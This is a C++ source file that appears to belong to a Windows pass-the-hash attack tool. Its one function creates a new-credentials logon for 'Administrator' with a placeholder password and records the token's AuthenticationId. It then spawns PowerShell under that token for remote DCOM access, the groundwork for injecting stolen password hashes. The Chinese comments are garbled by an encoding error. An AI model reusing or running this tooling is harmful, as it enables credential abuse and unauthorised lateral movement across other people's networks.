#include "stdafx.h"
#include "pth.h"

//����token��AuthenticationId��λ
BOOL LogonWithNewCredential(LPDWORD lpLowPart)
{
	LPWSTR lpDomain = NULL;// L"10.92.53.98"; ����Ҫ����������ΪNULL����
	LPWSTR lpUsername = L"Administrator";
	LPWSTR lpPassword = L"anything";

	//ʹ��LOGON32_LOGON_NEW_CREDENTIALS����LogonUser��ͬrunas��/netonly
	HANDLE hToken = NULL;
	BOOL bRet = LogonUserW(lpUsername, lpUsername, lpPassword,
		LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken);
	RETN_IF(!bRet, L"LogonUserW", FALSE);

	//����ģ������
	HANDLE hDupToken = NULL;
	bRet = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
	RETN_IF(!bRet, L"DuplicateToken", FALSE);

	CloseHandle(hToken);

	//��ȡ������Ϣ
	TOKEN_STATISTICS szTokenStatistics = { 0 };
	DWORD cbData = 0;
	bRet = GetTokenInformation(hDupToken, TokenStatistics, &szTokenStatistics, sizeof(szTokenStatistics), &cbData);
	RETN_IF(!bRet, L"GetTokenInformation", FALSE);

	MESSAGE(L"Token AuthenticationId:%d %d\r\n", szTokenStatistics.AuthenticationId.HighPart, szTokenStatistics.AuthenticationId.LowPart);
	*lpLowPart = szTokenStatistics.AuthenticationId.LowPart;
	//ʹ��ģ�����ƴ������̡����½�������ɽ���Զ��DCOM����
	STARTUPINFOW StartupInfo = { 0 };
	{
		StartupInfo.cb = sizeof(STARTUPINFO);
		StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
		StartupInfo.wShowWindow = TRUE;
	}
	PROCESS_INFORMATION ProcessInformation = { 0 };

	bRet = CreateProcessWithTokenW(hDupToken, LOGON_NETCREDENTIALS_ONLY, NULL, L"powershell.exe", CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInformation);
	RETN_IF(!bRet, L"CreateProcessWithTokenW", FALSE);

	return TRUE;
}

